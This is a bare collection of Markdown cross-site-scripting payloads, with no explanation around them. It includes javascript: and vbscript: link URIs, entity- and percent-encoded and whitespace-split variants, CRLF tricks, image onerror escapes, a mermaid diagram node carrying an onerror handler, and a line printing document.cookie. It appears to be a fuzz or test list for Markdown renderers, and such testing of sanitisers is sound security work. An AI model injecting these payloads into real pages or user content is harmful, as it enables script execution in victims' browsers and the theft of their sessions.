```.py "onmousemove='alert("XSS")'\\
print(document.cookie)
```

[a](javascript:confirm(1))

[a](javascript://www.test.com%0Aprompt(1))

[a](javascript://%0d%0aconfirm(1))

[a](javascript://%0d%0aconfirm(1);com)

[a](javascript:window.onerror=confirm;throw%201)

[a]: (javascript:prompt(1))

[a]:(?javascript:alert(1))    

[XSS](j    a   v   a   s   c   r   i   p   t:alert(1))

[ba]:(?\  j avascript:alert(1)) 

[XSS](&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29)
[XSS](vbscript:alert(document.domain))
[XSS](javascript:this;alert(1))
[XSS](javascript:this;alert(1&#41;)
[XSS](javascript&#58this;alert(1&#41;)
[XSS](Javas&#99;ript:alert(1&#41;)
[XSS](Javas%26%2399;ript:alert(1&#41;)


[XSS](�javascript:alert(document.domain&#41;)


![Escape SRC - onerror]("onerror="alert('ImageOnError'))

link: <a href="https://google.com" title="title">xss &lt;img onerror=alert(1) src=x></a>


[Click me too!](javascript:alert%28"xss"%29)

 ```mermaid
  graph LR
      B-->D(<img onerror=location=`javascript\u003aalert\u0028document.domain\u0029` src=x>);
 ```

